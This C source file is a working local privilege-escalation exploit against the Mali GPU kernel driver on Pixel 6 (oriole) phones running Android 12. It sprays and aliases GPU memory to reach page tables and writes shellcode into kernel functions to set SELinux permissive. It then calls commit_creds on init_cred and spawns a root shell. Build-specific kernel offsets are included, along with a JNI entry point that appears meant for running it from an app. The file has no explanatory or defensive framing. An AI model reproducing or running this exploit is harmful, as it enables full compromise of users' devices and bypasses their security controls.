#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "stdbool.h"
#include <sys/system_properties.h>
#include <sys/syscall.h>

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"

#ifdef SHELL
#define LOG(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
#include <android/log.h>
#define LOG(fmt, ...) __android_log_print(ANDROID_LOG_ERROR, "exploit", fmt, ##__VA_ARGS__)

#endif //SHELL

#define MALI "/dev/mali0"

#define PAGE_SHIFT 12

#define BASE_MEM_ALIAS_MAX_ENTS ((size_t)24576)

#define PFN_DOWN(x)	((x) >> PAGE_SHIFT)

#define SPRAY_PAGES 25

#define SPRAY_NUM 64

#define FLUSH_SIZE (0x1000 * 0x1000)

#define SPRAY_CPU 0

#define POOL_SIZE 16384

#define RESERVED_SIZE 32

#define TOTAL_RESERVED_SIZE 1024

#define FLUSH_REGION_SIZE 500

#define NUM_TRIALS 100

#define KERNEL_BASE 0x80000000

#define OVERWRITE_INDEX 256

#define ADRP_INIT_INDEX 0

#define ADD_INIT_INDEX 1

#define ADRP_COMMIT_INDEX 2

#define ADD_COMMIT_INDEX 3

#define AVC_DENY_2108 0x92df1c

#define SEL_READ_ENFORCE_2108 0x942ae4

#define INIT_CRED_2108 0x29a0570

#define COMMIT_CREDS_2108 0x180b0c

#define ADD_INIT_2108 0x9115c000

#define ADD_COMMIT_2108 0x912c3108

#define AVC_DENY_2201 0x930af4

#define SEL_READ_ENFORCE_2201 0x9456bc

#define INIT_CRED_2201 0x29b0570

#define COMMIT_CREDS_2201 0x183df0

#define ADD_INIT_2201 0x9115c000

#define ADD_COMMIT_2201 0x9137c108

#define AVC_DENY_2202 0x930b50

#define SEL_READ_ENFORCE_2202 0x94551c

#define INIT_CRED_2202 0x29b0570

#define COMMIT_CREDS_2202 0x183e3c

#define ADD_INIT_2202 0x9115c000    //add	x0, x0, #0x570

#define ADD_COMMIT_2202 0x9138f108  //add	x8, x8, #0xe3c

#define AVC_DENY_2207 0x927664

#define SEL_READ_ENFORCE_2207 0x93bf5c

#define INIT_CRED_2207 0x29e07f0

#define COMMIT_CREDS_2207 0x18629c

#define ADD_INIT_2207 0x911fc000 //add x0, x0, #0x7f0

#define ADD_COMMIT_2207 0x910a7108 //add x8, x8, #0x29c

static uint64_t sel_read_enforce = SEL_READ_ENFORCE_2207;

static uint64_t avc_deny = AVC_DENY_2207;

/*
Overwriting SELinux to permissive
  strb wzr, [x0]
  mov x0, #0
  ret
*/
static uint32_t permissive[3] = {0x3900001f, 0xd2800000,0xd65f03c0};

static uint32_t root_code[8] = {0};

static uint8_t jit_id = 1;
static uint8_t atom_number = 1;
static uint64_t gpu_va[SPRAY_NUM] = {0};
static int gpu_va_idx = 0;
static void* flush_regions[FLUSH_REGION_SIZE];
static void* alias_regions[SPRAY_NUM] = {0};
static uint64_t reserved[TOTAL_RESERVED_SIZE/RESERVED_SIZE];


struct base_mem_handle {
    struct {
        __u64 handle;
    } basep;
};

struct base_mem_aliasing_info {
    struct base_mem_handle handle;
    __u64 offset;
    __u64 length;
};

static int open_dev(char* name) {
    int fd = open(name, O_RDWR);
    if (fd == -1) {
        err(1, "cannot open %s\n", name);
    }
    return fd;
}

void setup_mali(int fd, int group_id) {
    struct kbase_ioctl_version_check param = {0};
    if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0) {
        err(1, "version check failed\n");
    }
    struct kbase_ioctl_set_flags set_flags = {group_id << 3};
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0) {
        err(1, "set flags failed\n");
    }
}

void* setup_tracking_page(int fd) {
    void* region = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
    if (region == MAP_FAILED) {
        err(1, "setup tracking page failed");
    }
    return region;
}

void jit_init(int fd, uint64_t va_pages, uint64_t trim_level, int group_id) {
    struct kbase_ioctl_mem_jit_init init = {0};
    init.va_pages = va_pages;
    init.max_allocations = 255;
    init.trim_level = trim_level;
    init.group_id = group_id;
    init.phys_pages = va_pages;

    if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &init) < 0) {
        err(1, "jit init failed\n");
    }
}

uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id, uint64_t va_pages, uint64_t gpu_alloc_addr) {
    struct base_jit_alloc_info info = {0};
    struct base_jd_atom_v2 atom = {0};

    info.id = id;
    info.gpu_alloc_addr = gpu_alloc_addr;
    info.va_pages = va_pages;
    info.commit_pages = va_pages;
    info.extension = 0x1000;

    atom.jc = (uint64_t)(&info);
    atom.atom_number = atom_number;
    atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
    atom.nr_extres = 1;
    struct kbase_ioctl_job_submit submit = {0};
    submit.addr = (uint64_t)(&atom);
    submit.nr_atoms = 1;
    submit.stride = sizeof(struct base_jd_atom_v2);
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
        err(1, "submit job failed\n");
    }
    return *((uint64_t*)gpu_alloc_addr);
}

void jit_free(int fd, uint8_t atom_number, uint8_t id) {
    uint8_t free_id = id;

    struct base_jd_atom_v2 atom = {0};

    atom.jc = (uint64_t)(&free_id);
    atom.atom_number = atom_number;
    atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
    atom.nr_extres = 1;
    struct kbase_ioctl_job_submit submit = {0};
    submit.addr = (uint64_t)(&atom);
    submit.nr_atoms = 1;
    submit.stride = sizeof(struct base_jd_atom_v2);
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
        err(1, "submit job failed\n");
    }

}

void mem_flags_change(int fd, uint64_t gpu_addr, uint32_t flags, int ignore_results) {
    struct kbase_ioctl_mem_flags_change change = {0};
    change.flags = flags;
    change.gpu_va = gpu_addr;
    change.mask = flags;
    if (ignore_results) {
        ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change);
        return;
    }
    if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change) < 0) {
        err(1, "flags_change failed\n");
    }
}

void mem_alloc(int fd, union kbase_ioctl_mem_alloc* alloc) {
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc) < 0) {
        err(1, "mem_alloc failed\n");
    }
}

void mem_alias(int fd, union kbase_ioctl_mem_alias* alias) {
    if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) < 0) {
        err(1, "mem_alias failed\n");
    }
}

void mem_query(int fd, union kbase_ioctl_mem_query* query) {
    if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) < 0) {
        err(1, "mem_query failed\n");
    }
}

void mem_commit(int fd, uint64_t gpu_addr, uint64_t pages) {
    struct kbase_ioctl_mem_commit commit = {.gpu_addr = gpu_addr, pages = pages};
    if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
        err(1, "mem_commit failed\n");
    }
}

void* map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group) {
    union kbase_ioctl_mem_alloc alloc = {0};
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (group << 22);
    int prot = PROT_READ;
    if (!read_only) {
        alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
        prot |= PROT_WRITE;
    }
    alloc.in.va_pages = va_pages;
    alloc.in.commit_pages = commit_pages;
    mem_alloc(mali_fd, &alloc);
    void* region = mmap(NULL, 0x1000 * va_pages, prot, MAP_SHARED, mali_fd, alloc.out.gpu_va);
    if (region == MAP_FAILED) {
        err(1, "mmap failed");
    }
    return region;
}

uint64_t alloc_mem(int mali_fd, unsigned int pages) {
    union kbase_ioctl_mem_alloc alloc = {0};
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
    int prot = PROT_READ | PROT_WRITE;
    alloc.in.va_pages = pages;
    alloc.in.commit_pages = pages;
    mem_alloc(mali_fd, &alloc);
    return alloc.out.gpu_va;
}

void free_mem(int mali_fd, uint64_t gpuaddr) {
    struct kbase_ioctl_mem_free mem_free = {.gpu_addr = gpuaddr};
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
        err(1, "free_mem failed\n");
    }
}

uint64_t drain_mem_pool(int mali_fd) {
    union kbase_ioctl_mem_alloc alloc = {0};
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR | (1 << 22);
    int prot = PROT_READ | PROT_WRITE;
    alloc.in.va_pages = POOL_SIZE;
    alloc.in.commit_pages = POOL_SIZE;
    mem_alloc(mali_fd, &alloc);
    return alloc.out.gpu_va;
}

void release_mem_pool(int mali_fd, uint64_t drain) {
    struct kbase_ioctl_mem_free mem_free = {.gpu_addr = drain};
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
        err(1, "free_mem failed\n");
    }
}

#define CPU_SETSIZE 1024
#define __NCPUBITS  (8 * sizeof (unsigned long))
typedef struct
{
    unsigned long __bits[CPU_SETSIZE / __NCPUBITS];
} cpu_set_t;

#define CPU_SET(cpu, cpusetp) \
  ((cpusetp)->__bits[(cpu)/__NCPUBITS] |= (1UL << ((cpu) % __NCPUBITS)))
#define CPU_ZERO(cpusetp) \
  memset((cpusetp), 0, sizeof(cpu_set_t))

int migrate_to_cpu(int i)
{
    int syscallres;
    pid_t pid = gettid();
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(i, &cpu);

    syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(cpu), &cpu);
    if (syscallres)
    {
        return -1;
    }
    return 0;
}

void* flush(int spray_cpu, int idx) {
    migrate_to_cpu(spray_cpu);
    void* region = mmap(NULL, FLUSH_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) err(1, "flush failed");
    memset(region, idx, FLUSH_SIZE);
    return region;
}

void reserve_pages(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
    for (int i = 0; i < nents; i++) {
        union kbase_ioctl_mem_alloc alloc = {0};
        alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR | (1 << 22);
        int prot = PROT_READ | PROT_WRITE;
        alloc.in.va_pages = pages;
        alloc.in.commit_pages = pages;
        mem_alloc(mali_fd, &alloc);
        reserved_va[i] = alloc.out.gpu_va;
    }
}

void map_reserved(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
    for (int i = 0; i < nents; i++) {
        void* reserved = mmap(NULL, 0x1000 * pages, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, reserved_va[i]);
        if (reserved == MAP_FAILED) {
            err(1, "mmap reserved failed");
        }
        reserved_va[i] = (uint64_t)reserved;
    }
}

uint64_t alias_sprayed_regions(int mali_fd) {
    union kbase_ioctl_mem_alias alias = {0};
    alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
    alias.in.stride = SPRAY_PAGES;

    alias.in.nents = SPRAY_NUM;
    struct base_mem_aliasing_info ai[SPRAY_NUM];
    for (int i = 0; i < SPRAY_NUM; i++) {
        ai[i].handle.basep.handle = gpu_va[i];
        ai[i].length = SPRAY_PAGES;
        ai[i].offset = 0;
    }
    alias.in.aliasing_info = (uint64_t)(&(ai[0]));
    mem_alias(mali_fd, &alias);
    uint64_t region_size = 0x1000 * SPRAY_NUM * SPRAY_PAGES;
    void* region = mmap(NULL, region_size, PROT_READ, MAP_SHARED, mali_fd, alias.out.gpu_va);
    if (region == MAP_FAILED) {
        err(1, "mmap alias failed");
    }
    alias_regions[0] = region;
    for (int i = 1; i < SPRAY_NUM; i++) {
        void* this_region = mmap(NULL, 0x1000 * SPRAY_PAGES, PROT_READ, MAP_SHARED, mali_fd,  (uint64_t)region + i * 0x1000 * SPRAY_PAGES);
        if (this_region == MAP_FAILED) {
            err(1, "mmap alias failed %d\n", i);
        }
        alias_regions[i] = this_region;
    }
    return (uint64_t)region;
}

void fault_pages() {
    int read = 0;
    for (int va = 0; va < SPRAY_NUM; va++) {
        uint8_t* this_va = (uint8_t*)(gpu_va[va]);
        *this_va = 0;
        uint8_t* this_alias = alias_regions[va];
        read += *this_alias;
    }
    LOG("read %d\n", read);
}

int find_freed_idx(int mali_fd) {
    int freed_idx = -1;
    for (int j = 0; j < SPRAY_NUM; j++) {
        union kbase_ioctl_mem_query query = {0};
        query.in.gpu_addr = gpu_va[j];
        query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
        ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query);
        if (query.out.value != SPRAY_PAGES) {
            LOG("jit_free commit: %d %llu\n", j, query.out.value);
            freed_idx = j;
        }
    }
    return freed_idx;
}

int find_pgd(int freed_idx, int start_pg) {
    uint64_t* this_alias = alias_regions[freed_idx];
    for (int pg = start_pg; pg < SPRAY_PAGES; pg++) {
        for (int i = 0; i < 0x1000/8; i++) {
            uint64_t entry = this_alias[pg * 0x1000/8 + i];
            if ((entry & 0x443) == 0x443) {
                return pg;
            }
        }
    }
    return -1;
}

uint32_t lo32(uint64_t x) {
    return x & 0xffffffff;
}

uint32_t hi32(uint64_t x) {
    return x >> 32;
}

uint32_t write_adrp(int rd, uint64_t pc, uint64_t label) {
    uint64_t pc_page = pc >> 12;
    uint64_t label_page = label >> 12;
    int64_t offset = (label_page - pc_page) << 12;
    int64_t immhi_mask = 0xffffe0;
    int64_t immhi = offset >> 14;
    int32_t immlo = (offset >> 12) & 0x3;
    uint32_t adpr = rd & 0x1f;
    adpr |= (1 << 28);
    adpr |= (1 << 31); //op
    adpr |= immlo << 29;
    adpr |= (immhi_mask & (immhi << 5));
    return adpr;
}

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_enforce, uint32_t add_init, uint32_t add_commit) {

    uint32_t init_adpr = write_adrp(0, read_enforce, init_cred);
    //Sets x0 to init_cred
    root_code[ADRP_INIT_INDEX] = init_adpr;
    root_code[ADD_INIT_INDEX] = add_init;
    //Sets x8 to commit_creds
    root_code[ADRP_COMMIT_INDEX] = write_adrp(8, read_enforce, commit_cred);
    root_code[ADD_COMMIT_INDEX] = add_commit;
    root_code[4] = 0xa9bf7bfd; // stp x29, x30, [sp, #-0x10]
    root_code[5] = 0xd63f0100; // blr x8
    root_code[6] = 0xa8c17bfd; // ldp x29, x30, [sp], #0x10
    root_code[7] = 0xd65f03c0; // ret
}

uint64_t set_addr_lv3(uint64_t addr) {
    uint64_t pfn = addr >> PAGE_SHIFT;
    pfn &= ~ 0x1FFUL;
    pfn |= 0x100UL;
    return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level) {
    uint64_t vpfn = addr >> PAGE_SHIFT;
    vpfn >>= (3 - level) * 9;
    return vpfn & 0x1FF;
}

void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, enum mali_write_value_type type) {
    void* jc_region = map_gpu(mali_fd, 1, 1, false, 0);
    struct MALI_JOB_HEADER jh = {0};
    jh.is_64b = true;
    jh.type = MALI_JOB_TYPE_WRITE_VALUE;

    struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = {0};
    payload.type = type;
    payload.immediate_value = value;
    payload.address = gpu_addr;

    MALI_JOB_HEADER_pack((uint32_t*)jc_region, &jh);
    MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)jc_region + 8, &payload);
    uint32_t* section = (uint32_t*)jc_region;
    struct base_jd_atom_v2 atom = {0};
    atom.jc = (uint64_t)jc_region;
    atom.atom_number = atom_number;
    atom.core_req = BASE_JD_REQ_CS;
    struct kbase_ioctl_job_submit submit = {0};
    submit.addr = (uint64_t)(&atom);
    submit.nr_atoms = 1;
    submit.stride = sizeof(struct base_jd_atom_v2);
    if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
        err(1, "submit job failed\n");
    }
    usleep(10000);
}

void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size) {
    uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
    uint64_t curr_overwrite_addr = 0;
    for (int i = 0; i < size; i++) {
        uint64_t base = reserved[i];
        uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
        uint64_t start_idx = compute_pt_index(base, 3);
        uint64_t end_idx = compute_pt_index(end, 3);
        for (uint64_t addr = base; addr < end; addr += 0x1000) {
            uint64_t overwrite_addr = set_addr_lv3(addr);
            if (curr_overwrite_addr != overwrite_addr) {
                LOG("overwrite addr : %lx %lx\n", overwrite_addr + func_offset, func_offset);
                curr_overwrite_addr = overwrite_addr;
                for (int code = code_size - 1; code >= 0; code--) {
                    write_to(mali_fd, overwrite_addr + func_offset + code * 4, shellcode[code], atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
                }
                usleep(300000);
            }
        }
    }
}

int run_enforce() {
    char result = '2';
    sleep(3);
    int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    read(enforce_fd, &result, 1);
    close(enforce_fd);
    LOG("result %d\n", result);
    return result;
}

void select_offset() {
    char fingerprint[256];
    int len = __system_property_get("ro.build.fingerprint", fingerprint);
    LOG("fingerprint: %s\n", fingerprint);
    if (!strcmp(fingerprint, "google/oriole/oriole:12/SD1A.210817.037/7862242:user/release-keys")) {
        avc_deny = AVC_DENY_2108;
        sel_read_enforce = SEL_READ_ENFORCE_2108;
        fixup_root_shell(INIT_CRED_2108, COMMIT_CREDS_2108, SEL_READ_ENFORCE_2108, ADD_INIT_2108, ADD_COMMIT_2108);
        return;
    }
    if (!strcmp(fingerprint, "google/oriole/oriole:12/SQ1D.220105.007/8030436:user/release-keys")) {
        avc_deny = AVC_DENY_2201;
        sel_read_enforce = SEL_READ_ENFORCE_2201;
        fixup_root_shell(INIT_CRED_2201, COMMIT_CREDS_2201, SEL_READ_ENFORCE_2201, ADD_INIT_2201, ADD_COMMIT_2201);
        return;
    }
    if (!strcmp(fingerprint, "google/oriole/oriole:12/SQ1D.220205.004/8151327:user/release-keys")) {
        avc_deny = AVC_DENY_2202;
        sel_read_enforce = SEL_READ_ENFORCE_2202;
        fixup_root_shell(INIT_CRED_2202, COMMIT_CREDS_2202, SEL_READ_ENFORCE_2202, ADD_INIT_2202, ADD_COMMIT_2202);
        return;
    }
    if (!strcmp(fingerprint, "google/oriole/oriole:12/SQ3A.220705.003/8671607:user/release-keys")) {
        avc_deny = AVC_DENY_2207;
        sel_read_enforce = SEL_READ_ENFORCE_2207;
        fixup_root_shell(INIT_CRED_2207, COMMIT_CREDS_2207, SEL_READ_ENFORCE_2207, ADD_INIT_2207, ADD_COMMIT_2207);
        return;
    }

    err(1, "unable to match build id\n");
}

void cleanup(int mali_fd, uint64_t pgd) {
    write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), 2, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
}

void write_shellcode(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved) {
    uint64_t avc_deny_addr = (((avc_deny + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
    write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), avc_deny_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

    usleep(100000);
    //Go through the reserve pages addresses to write to avc_denied with our own shellcode
    write_func(mali_fd2, avc_deny, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(permissive[0]), sizeof(permissive)/sizeof(uint32_t));

    //Triggers avc_denied to disable SELinux
    open("/dev/kmsg", O_RDONLY);

    uint64_t sel_read_enforce_addr = (((sel_read_enforce + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
    write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), sel_read_enforce_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

    //Call commit_creds to overwrite process credentials to gain root
    write_func(mali_fd2, sel_read_enforce, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(root_code[0]), sizeof(root_code)/sizeof(uint32_t));
}

void spray(int mali_fd) {
    uint64_t cookies[32] = {0};
    for (int j = 0; j < 32; j++) {
        union kbase_ioctl_mem_alloc alloc = {0};
        alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (1 << 22);
        alloc.in.va_pages = SPRAY_PAGES;
        alloc.in.commit_pages = 0;
        mem_alloc(mali_fd, &alloc);
        cookies[j] = alloc.out.gpu_va;
    }
    for (int j = 0; j < 32; j++) {
        void* region = mmap(NULL, 0x1000 * SPRAY_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, cookies[j]);
        if (region == MAP_FAILED) {
            err(1, "mmap failed");
        }
        gpu_va[j] = (uint64_t)region;
    }
    for (int j = 32; j < 64; j++) {
        union kbase_ioctl_mem_alloc alloc = {0};
        alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (1 << 22);
        alloc.in.va_pages = SPRAY_PAGES;
        alloc.in.commit_pages = 0;
        mem_alloc(mali_fd, &alloc);
        cookies[j - 32] = alloc.out.gpu_va;
    }
    for (int j = 32; j < 64; j++) {
        void* region = mmap(NULL, 0x1000 * SPRAY_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, cookies[j - 32]);
        if (region == MAP_FAILED) {
            err(1, "mmap failed");
        }
        gpu_va[j] = (uint64_t)region;
    }
}

int trigger(int mali_fd, int mali_fd2, int* flush_idx) {
    if (*flush_idx + NUM_TRIALS > FLUSH_REGION_SIZE) {
        err(1, "Out of memory.");
    }
    void* gpu_alloc_addr = map_gpu(mali_fd, 1, 1, false, 0);

    uint64_t jit_pages = SPRAY_PAGES;
    uint64_t jit_addr = jit_allocate(mali_fd, atom_number, jit_id, jit_pages, (uint64_t)gpu_alloc_addr);
    atom_number++;
    mem_flags_change(mali_fd, (uint64_t)jit_addr, BASE_MEM_DONT_NEED, 0);
    for (int i = 0; i < NUM_TRIALS; i++) {
        union kbase_ioctl_mem_query query = {0};
        query.in.gpu_addr = jit_addr;
        query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
        flush_regions[i] = flush(SPRAY_CPU, i + *flush_idx);
        if (ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query) < 0) {
            migrate_to_cpu(SPRAY_CPU);
            spray(mali_fd);
            for (int j = 0; j < SPRAY_NUM; j++) {
                mem_commit(mali_fd, gpu_va[j], SPRAY_PAGES);
            }
            LOG("region freed %d\n", i);

            uint64_t alias_region = alias_sprayed_regions(mali_fd);
            fault_pages();
            LOG("cleanup flush region\n");
            for (int r = 0; r < FLUSH_REGION_SIZE; r++) munmap(flush_regions[r], FLUSH_SIZE);

            uint64_t drain = drain_mem_pool(mali_fd);
            release_mem_pool(mali_fd, drain);

            jit_free(mali_fd, atom_number, jit_id);

            map_reserved(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
            LOG("jit_freed\n");
            int freed_idx = find_freed_idx(mali_fd);
            if (freed_idx == -1) err(1, "Failed to find freed_idx");
            LOG("Found freed_idx %d\n", freed_idx);
            int pgd_idx = find_pgd(freed_idx, 0);
            if (pgd_idx == -1) err(1, "Failed to find pgd");
            uint64_t pgd = alias_region + pgd_idx * 0x1000 + freed_idx * (SPRAY_PAGES * 0x1000);
            LOG("Found pgd %d, %lx\n", pgd_idx, pgd);
            atom_number++;
            write_shellcode(mali_fd, mali_fd2, pgd, &(reserved[0]));
            run_enforce();
            cleanup(mali_fd, pgd);
            return 0;
        }
    }
    LOG("failed, retry.\n");
    jit_id++;
    *flush_idx += NUM_TRIALS;
    return -1;
}

#ifdef SHELL

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  select_offset();
  int mali_fd = open_dev(MALI);

  setup_mali(mali_fd, 0);

  void* tracking_page = setup_tracking_page(mali_fd);
  jit_init(mali_fd, 0x1000, 100, 0);

  int mali_fd2 = open_dev(MALI);
  setup_mali(mali_fd2, 1);
  setup_tracking_page(mali_fd2);
  reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
  int flush_idx = 0;
  for (int i = 0; i < 10; i++) {
    if(!trigger(mali_fd, mali_fd2, &flush_idx)) {
      system("sh");
      break;
    }
  }
}
#else
#include <jni.h>
JNIEXPORT int JNICALL
Java_com_example_hellojni_MaliExpService_stringFromJNI( JNIEnv* env, jobject thiz)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    sleep(10);

    select_offset();
    int mali_fd = open_dev(MALI);

    setup_mali(mali_fd, 0);

    void* tracking_page = setup_tracking_page(mali_fd);
    jit_init(mali_fd, 0x1000, 100, 0);

    int mali_fd2 = open_dev(MALI);
    setup_mali(mali_fd2, 1);
    setup_tracking_page(mali_fd2);
    reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
    int flush_idx = 0;
    for (int i = 0; i < 10; i++) {
        if(!trigger(mali_fd, mali_fd2, &flush_idx)) {
            LOG("uid: %d euid %d", getuid(), geteuid());
            return 0;
        }
    }
    return -1;
}
#endif
